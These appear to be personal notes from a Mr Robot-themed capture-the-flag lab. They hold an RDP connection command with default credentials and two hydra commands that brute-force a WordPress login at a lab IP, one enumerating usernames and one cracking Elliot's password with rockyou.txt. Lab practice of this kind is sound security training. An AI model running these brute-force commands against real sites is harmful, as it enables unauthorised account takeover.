RDP: xfreerdp /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea
 hydra -L fsocity.dic -p test 10.10.202.57 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

hydra -l Elliot -P /usr/share/wordlists/rockyou.txt 10.10.202.57 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password" -t 30
